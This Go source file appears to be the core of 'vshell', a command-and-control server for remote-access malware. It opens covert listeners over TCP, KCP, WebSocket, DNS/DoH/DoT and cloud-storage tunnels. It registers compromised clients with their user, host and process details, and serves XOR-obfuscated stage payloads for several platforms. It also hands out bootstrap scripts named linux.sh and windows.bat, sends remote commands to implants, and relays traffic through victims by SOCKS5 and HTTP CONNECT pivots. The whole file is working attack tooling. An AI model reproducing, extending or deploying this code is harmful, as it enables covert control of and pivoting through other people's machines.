package core

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"vshell/internal/model"
	"vshell/internal/protocol"
	"vshell/internal/store"

	"github.com/gorilla/websocket"
	kcp "github.com/xtaci/kcp-go/v5"
)

type Session struct {
	ClientID int64
	conn     *protocol.Conn
	pending  sync.Map
	closed   chan struct{}
	once     sync.Once
}

type Core struct {
	Store        *store.Store
	mu           sync.RWMutex
	listeners    map[int64]io.Closer
	sessions     map[int64]*Session
	workersWG    sync.WaitGroup
	streams      map[string]chan net.Conn
	tunnels      map[int64]io.Closer
	requestSeq   atomic.Uint64
	Bootstrap    func(model.Listener, string) ([]byte, string, error)
	StagePayload func(model.Listener, string) ([]byte, error)
}

func New(st *store.Store) *Core {
	return &Core{Store: st, listeners: map[int64]io.Closer{}, sessions: map[int64]*Session{}, streams: map[string]chan net.Conn{}, tunnels: map[int64]io.Closer{}}
}

func (c *Core) StartSaved() {
	for _, l := range c.Store.Listeners() {
		if l.Status {
			_ = c.StartListener(l.ID)
		}
	}
	for _, t := range c.Store.Tunnels() {
		if t.Status {
			_ = c.StartTunnel(t.ID)
		}
	}
}

func (c *Core) Close() {
	c.mu.Lock()
	for _, l := range c.listeners {
		_ = l.Close()
	}
	for _, l := range c.tunnels {
		_ = l.Close()
	}
	for _, s := range c.sessions {
		s.close()
	}
	c.mu.Unlock()
	c.workersWG.Wait()
}

func (s *Session) close() {
	s.once.Do(func() {
		close(s.closed)
		_ = s.conn.Close()
		s.pending.Range(func(_, v any) bool { close(v.(chan protocol.Message)); return true })
	})
}

func (c *Core) StartListener(id int64) error {
	l, ok := c.Store.Listener(id)
	if !ok {
		return errors.New("listener not found")
	}
	if l.ListenAddr == "" && l.Mode != "oss" {
		return errors.New("listen address is empty")
	}
	if l.Mode == "oss" && l.OssURL == "" {
		return errors.New("oss url is empty")
	}
	if l.Mode == "oss" && l.OSSKey == "" {
		l.OSSKey = randomID()
		_ = c.Store.UpdateListener(l)
	}
	c.mu.Lock()
	if _, exists := c.listeners[id]; exists {
		c.mu.Unlock()
		return nil
	}
	c.mu.Unlock()
	if l.Mode == "ws" {
		return c.startWebSocketListener(l)
	}
	var ln net.Listener
	var err error
	if l.Mode == "oss" {
		ln, err = protocol.ListenOSSTunnel(l.OssURL, l.OSSKey)
	} else if l.Mode == "dns" || l.Mode == "doh" || l.Mode == "dot" {
		ln, err = protocol.ListenDNSTunnel(l.ListenAddr, l.DNSDomain)
	} else if l.Mode == "kcp" {
		ln, err = kcp.ListenWithOptions(l.ListenAddr, nil, 10, 3)
	} else {
		ln, err = net.Listen("tcp", l.ListenAddr)
	}
	if err != nil {
		return err
	}
	c.mu.Lock()
	c.listeners[id] = ln
	c.mu.Unlock()
	l.Status = true
	l.RunStatus = true
	_ = c.Store.UpdateListener(l)
	go c.acceptLoop(l, ln)
	return nil
}

type webSocketListener struct {
	ln     net.Listener
	server *http.Server
}

func (l *webSocketListener) Close() error {
	err := l.ln.Close()
	_ = l.server.Close()
	return err
}

var listenerWSUpgrader = websocket.Upgrader{
	ReadBufferSize:  32 << 10,
	WriteBufferSize: 32 << 10,
	CheckOrigin:     func(*http.Request) bool { return true },
}

func (c *Core) startWebSocketListener(listener model.Listener) error {
	ln, err := net.Listen("tcp", listener.ListenAddr)
	if err != nil {
		return err
	}
	mux := http.NewServeMux()
	server := &http.Server{Handler: mux}
	runtime := &webSocketListener{ln: ln, server: server}
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if websocket.IsWebSocketUpgrade(r) {
			ws, upgradeErr := listenerWSUpgrader.Upgrade(w, r, nil)
			if upgradeErr != nil {
				return
			}
			c.workersWG.Add(1)
			defer c.workersWG.Done()
			c.acceptConn(listener, protocol.NewWebSocketConn(ws))
			return
		}
		if c.Bootstrap == nil {
			http.NotFound(w, r)
			return
		}
		data, contentType, bootstrapErr := c.Bootstrap(listener, r.URL.RequestURI())
		if bootstrapErr != nil {
			http.Error(w, bootstrapErr.Error(), http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", contentType)
		_, _ = w.Write(data)
	})
	c.mu.Lock()
	c.listeners[listener.ID] = runtime
	c.mu.Unlock()
	listener.Status = true
	listener.RunStatus = true
	_ = c.Store.UpdateListener(listener)
	go func() { _ = server.Serve(ln) }()
	return nil
}

func (c *Core) StopListener(id int64) error {
	c.mu.Lock()
	ln := c.listeners[id]
	delete(c.listeners, id)
	c.mu.Unlock()
	if ln != nil {
		_ = ln.Close()
	}
	l, ok := c.Store.Listener(id)
	if ok {
		l.Status = false
		l.RunStatus = false
		return c.Store.UpdateListener(l)
	}
	return errors.New("listener not found")
}

func (c *Core) acceptLoop(listener model.Listener, ln net.Listener) {
	for {
		raw, err := ln.Accept()
		if err != nil {
			return
		}
		if session, ok := raw.(*kcp.UDPSession); ok {
			if listener.Mode == "dns" || listener.Mode == "doh" || listener.Mode == "dot" {
				protocol.TuneDNSConn(session)
			} else {
				tuneKCP(session)
			}
		}
		c.workersWG.Add(1)
		go func() {
			defer c.workersWG.Done()
			c.acceptConn(listener, raw)
		}()
	}
}

func tuneKCP(session *kcp.UDPSession) {
	session.SetStreamMode(true)
	session.SetWriteDelay(true)
	session.SetNoDelay(1, 10, 2, 1)
	session.SetWindowSize(1024, 1024)
	_ = session.SetMtu(1350)
	session.SetACKNoDelay(true)
}

func (c *Core) acceptConn(listener model.Listener, raw net.Conn) {
	reader := bufio.NewReader(raw)
	_ = raw.SetReadDeadline(time.Now().Add(15 * time.Second))
	prefix, err := reader.Peek(4)
	if err != nil {
		_ = raw.Close()
		return
	}
	if string(prefix) == "GET " {
		c.serveBootstrap(listener, reader, raw)
		return
	}
	if selector, peekErr := reader.Peek(6); peekErr == nil && isStageSelector(string(selector)) {
		c.serveStage(listener, reader, raw)
		return
	}
	buffered := &bufferedConn{Conn: raw, reader: reader}
	pc := protocol.NewConn(buffered)
	first, err := pc.ReadMessage()
	if err != nil {
		_ = raw.Close()
		return
	}
	_ = raw.SetReadDeadline(time.Time{})
	switch first.Type {
	case "hello":
		var hello model.Hello
		if json.Unmarshal(first.Data, &hello) != nil || hello.Vkey != listener.Vkey {
			_ = raw.Close()
			return
		}
		remoteAddr := raw.RemoteAddr().String()
		remote, _, splitErr := net.SplitHostPort(remoteAddr)
		if splitErr != nil {
			remote = remoteAddr
		}
		location := "Unknown"
		if ip := net.ParseIP(remote); ip != nil && ip.IsPrivate() && !ip.IsLoopback() {
			location = "本地局域网"
		}
		cl := model.Client{VerifyKey: hello.VerifyKey, IsConnect: true, Status: true, Tp: listener.Mode, Addr: remote, LocalIP: hello.LocalIP, UserName: hello.UserName, HostName: hello.HostName, Location: location, OsName: hello.OSName, ProcessName: hello.ProcessName, ListenerID: listener.ID, LastSeen: time.Now()}
		cl, err = c.Store.UpsertClient(cl)
		if err != nil {
			_ = raw.Close()
			return
		}
		s := &Session{ClientID: cl.ID, conn: pc, closed: make(chan struct{})}
		c.mu.Lock()
		if old := c.sessions[cl.ID]; old != nil {
			old.close()
		}
		c.sessions[cl.ID] = s
		c.mu.Unlock()
		_ = pc.WriteMessage(protocol.Message{Type: "hello_ack", OK: true, Data: protocol.MarshalData(map[string]any{"id": cl.ID, "ping_interval": listener.PingInterval})})
		c.sessionReadLoop(s)
	case "stream":
		c.mu.RLock()
		ch := c.streams[first.StreamID]
		c.mu.RUnlock()
		if ch == nil {
			_ = raw.Close()
			return
		}
		select {
		case ch <- buffered:
		case <-time.After(10 * time.Second):
			_ = raw.Close()
		}
	default:
		_ = raw.Close()
	}
}

func isStageSelector(selector string) bool {
	switch selector {
	case "w64   ", "w32   ", "l64   ", "l32   ", "a64   ", "a32   ", "d64   ", "m64   ":
		return true
	default:
		return false
	}
}

func (c *Core) serveStage(listener model.Listener, reader *bufio.Reader, raw net.Conn) {
	defer raw.Close()
	handshake := make([]byte, 40)
	if _, err := io.ReadFull(reader, handshake); err != nil || c.StagePayload == nil {
		return
	}
	payload, err := c.StagePayload(listener, string(handshake[:6]))
	if err != nil {
		return
	}
	for i := range payload {
		payload[i] ^= 0x99
	}
	_, _ = raw.Write(payload)
}

type bufferedConn struct {
	net.Conn
	reader io.Reader
}

func (c *bufferedConn) Read(p []byte) (int, error) { return c.reader.Read(p) }

func (c *Core) serveBootstrap(listener model.Listener, reader *bufio.Reader, raw net.Conn) {
	defer raw.Close()
	request, err := http.ReadRequest(reader)
	if err != nil {
		return
	}
	if request.Body != nil {
		_ = request.Body.Close()
	}
	if c.Bootstrap == nil {
		_, _ = io.WriteString(raw, "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
		return
	}
	body, contentType, err := c.Bootstrap(listener, request.URL.RequestURI())
	if err != nil {
		message := []byte(err.Error())
		_, _ = fmt.Fprintf(raw, "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/plain\r\nContent-Length: %d\r\nConnection: close\r\n\r\n", len(message))
		_, _ = raw.Write(message)
		return
	}
	if contentType == "" {
		contentType = "application/octet-stream"
	}
	extraHeaders := ""
	switch request.URL.Path {
	case "/slt", "/slw", "/slk":
		extraHeaders = "Access-Control-Allow-Origin: *\r\nContent-Disposition: attachment; filename=linux.sh\r\n"
	case "/swt", "/sww", "/swk":
		extraHeaders = "Access-Control-Allow-Origin: *\r\nContent-Disposition: attachment; filename=windows.bat\r\n"
	}
	_, _ = fmt.Fprintf(raw, "HTTP/1.1 200 OK\r\nContent-Type: %s\r\n%sContent-Length: %d\r\nConnection: close\r\n\r\n", contentType, extraHeaders, len(body))
	_, _ = raw.Write(body)
}

func (c *Core) sessionReadLoop(s *Session) {
	defer func() {
		s.close()
		c.mu.Lock()
		if c.sessions[s.ClientID] == s {
			delete(c.sessions, s.ClientID)
		}
		c.mu.Unlock()
		if cl, ok := c.Store.Client(s.ClientID); ok {
			cl.IsConnect = false
			_ = c.Store.UpdateClient(cl)
		}
	}()
	for {
		m, err := s.conn.ReadMessage()
		if err != nil {
			return
		}
		if m.Type == "response" {
			if v, ok := s.pending.LoadAndDelete(m.RequestID); ok {
				v.(chan protocol.Message) <- m
			}
		}
	}
}

func (c *Core) session(id int64) (*Session, error) {
	c.mu.RLock()
	s := c.sessions[id]
	c.mu.RUnlock()
	if s == nil {
		return nil, errors.New("client is close")
	}
	return s, nil
}

func (c *Core) Call(ctx context.Context, clientID int64, action string, data any) (json.RawMessage, error) {
	s, err := c.session(clientID)
	if err != nil {
		return nil, err
	}
	rid := fmt.Sprintf("%d-%d", time.Now().UnixNano(), c.requestSeq.Add(1))
	ch := make(chan protocol.Message, 1)
	s.pending.Store(rid, ch)
	defer s.pending.Delete(rid)
	if err := s.conn.WriteMessage(protocol.Message{Type: "request", RequestID: rid, Action: action, Data: protocol.MarshalData(data)}); err != nil {
		return nil, err
	}
	select {
	case m, ok := <-ch:
		if !ok {
			return nil, errors.New("client is close")
		}
		if !m.OK {
			return nil, errors.New(m.Error)
		}
		return m.Data, nil
	case <-ctx.Done():
		return nil, ctx.Err()
	case <-s.closed:
		return nil, errors.New("client is close")
	}
}

func (c *Core) IsOnline(id int64) bool { _, err := c.session(id); return err == nil }

func (c *Core) StartTunnel(id int64) error {
	t, ok := c.Store.Tunnel(id)
	if !ok {
		return errors.New("tunnel not found")
	}
	if !c.IsOnline(t.ClientID) {
		return errors.New("client is close")
	}
	c.mu.Lock()
	if _, exists := c.tunnels[id]; exists {
		c.mu.Unlock()
		return nil
	}
	c.mu.Unlock()
	if t.Mode == "udp" {
		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("0.0.0.0:%d", t.Port))
		if err != nil {
			return err
		}
		conn, err := net.ListenUDP("udp", addr)
		if err != nil {
			return err
		}
		c.mu.Lock()
		c.tunnels[id] = conn
		c.mu.Unlock()
		t.RunStatus = true
		t.Status = true
		t.IsConnect = true
		_ = c.Store.UpdateTunnel(t)
		go c.udpTunnelLoop(t, conn)
		return nil
	}
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", t.Port))
	if err != nil {
		return err
	}
	c.mu.Lock()
	c.tunnels[id] = ln
	c.mu.Unlock()
	t.RunStatus = true
	t.Status = true
	t.IsConnect = true
	_ = c.Store.UpdateTunnel(t)
	go c.tunnelAcceptLoop(t, ln)
	return nil
}

func (c *Core) udpTunnelLoop(t model.Tunnel, conn *net.UDPConn) {
	buf := make([]byte, 65535)
	for {
		n, peer, err := conn.ReadFromUDP(buf)
		if err != nil {
			return
		}
		request := append([]byte(nil), buf[:n]...)
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
			defer cancel()
			raw, err := c.Call(ctx, t.ClientID, "udp_exchange", map[string]any{
				"target":  t.Target,
				"content": base64.StdEncoding.EncodeToString(request),
			})
			if err != nil {
				return
			}
			var encoded string
			if json.Unmarshal(raw, &encoded) != nil {
				return
			}
			response, err := base64.StdEncoding.DecodeString(encoded)
			if err == nil {
				_, _ = conn.WriteToUDP(response, peer)
			}
		}()
	}
}
func (c *Core) StopTunnel(id int64) error {
	c.mu.Lock()
	ln := c.tunnels[id]
	delete(c.tunnels, id)
	c.mu.Unlock()
	if ln != nil {
		_ = ln.Close()
	}
	t, ok := c.Store.Tunnel(id)
	if !ok {
		return errors.New("tunnel not found")
	}
	t.RunStatus = false
	t.Status = false
	t.IsConnect = c.IsOnline(t.ClientID)
	return c.Store.UpdateTunnel(t)
}
func (c *Core) tunnelAcceptLoop(t model.Tunnel, ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go c.handleTunnelConn(t, conn)
	}
}

func (c *Core) handleTunnelConn(t model.Tunnel, incoming net.Conn) {
	defer incoming.Close()
	target := t.Target
	if t.Mode == "socks5" {
		var err error
		target, err = readSOCKS5(incoming, t.Username, t.Password)
		if err != nil {
			return
		}
	} else if t.Mode == "http" {
		var err error
		target, err = readHTTPConnect(incoming, t.Username, t.Password)
		if err != nil {
			return
		}
	}
	streamID := randomID()
	ch := make(chan net.Conn, 1)
	c.mu.Lock()
	c.streams[streamID] = ch
	c.mu.Unlock()
	defer func() { c.mu.Lock(); delete(c.streams, streamID); c.mu.Unlock() }()
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	_, err := c.Call(ctx, t.ClientID, "open_stream", map[string]any{"stream_id": streamID, "target": target})
	if err != nil {
		return
	}
	var remote net.Conn
	select {
	case remote = <-ch:
	case <-ctx.Done():
		return
	}
	defer remote.Close()
	go func() { n, _ := io.Copy(remote, incoming); atomic.AddInt64(&t.Flow.InletFlow, n); _ = remote.Close() }()
	n, _ := io.Copy(incoming, remote)
	atomic.AddInt64(&t.Flow.ExportFlow, n)
}

func readSOCKS5(c net.Conn, user, pass string) (string, error) {
	h := make([]byte, 2)
	if _, e := io.ReadFull(c, h); e != nil || h[0] != 5 {
		return "", errors.New("bad socks version")
	}
	m := make([]byte, int(h[1]))
	if _, e := io.ReadFull(c, m); e != nil {
		return "", e
	}
	method := byte(0)
	if user != "" {
		method = 2
	}
	_, _ = c.Write([]byte{5, method})
	if method == 2 {
		if _, e := io.ReadFull(c, h[:2]); e != nil {
			return "", e
		}
		ub := make([]byte, int(h[1]))
		_, _ = io.ReadFull(c, ub)
		pbLen := make([]byte, 1)
		_, _ = io.ReadFull(c, pbLen)
		pb := make([]byte, int(pbLen[0]))
		_, _ = io.ReadFull(c, pb)
		if string(ub) != user || string(pb) != pass {
			_, _ = c.Write([]byte{1, 1})
			return "", errors.New("auth failed")
		}
		_, _ = c.Write([]byte{1, 0})
	}
	req := make([]byte, 4)
	if _, e := io.ReadFull(c, req); e != nil || req[1] != 1 {
		return "", errors.New("unsupported command")
	}
	var host string
	switch req[3] {
	case 1:
		b := make([]byte, 4)
		_, _ = io.ReadFull(c, b)
		host = net.IP(b).String()
	case 3:
		l := make([]byte, 1)
		_, _ = io.ReadFull(c, l)
		b := make([]byte, int(l[0]))
		_, _ = io.ReadFull(c, b)
		host = string(b)
	case 4:
		b := make([]byte, 16)
		_, _ = io.ReadFull(c, b)
		host = net.IP(b).String()
	default:
		return "", errors.New("bad address")
	}
	p := make([]byte, 2)
	_, _ = io.ReadFull(c, p)
	port := int(p[0])<<8 | int(p[1])
	_, _ = c.Write([]byte{5, 0, 0, 1, 0, 0, 0, 0, 0, 0})
	return net.JoinHostPort(host, fmt.Sprint(port)), nil
}
func readHTTPConnect(c net.Conn, user, pass string) (string, error) {
	buf := make([]byte, 8192)
	n, e := c.Read(buf)
	if e != nil {
		return "", e
	}
	lines := strings.Split(string(buf[:n]), "\r\n")
	parts := strings.Fields(lines[0])
	if len(parts) < 2 || strings.ToUpper(parts[0]) != "CONNECT" {
		return "", errors.New("CONNECT required")
	}
	if user != "" {
		expected := "Basic " + base64.StdEncoding.EncodeToString([]byte(user+":"+pass))
		provided := ""
		for _, line := range lines[1:] {
			name, value, ok := strings.Cut(line, ":")
			if ok && strings.EqualFold(strings.TrimSpace(name), "Proxy-Authorization") {
				provided = strings.TrimSpace(value)
				break
			}
		}
		if provided != expected {
			_, _ = c.Write([]byte("HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: Basic realm=\"vShell\"\r\nContent-Length: 0\r\n\r\n"))
			return "", errors.New("auth failed")
		}
	}
	_, _ = c.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))
	return parts[1], nil
}
func randomID() string { b := make([]byte, 16); _, _ = rand.Read(b); return hex.EncodeToString(b) }
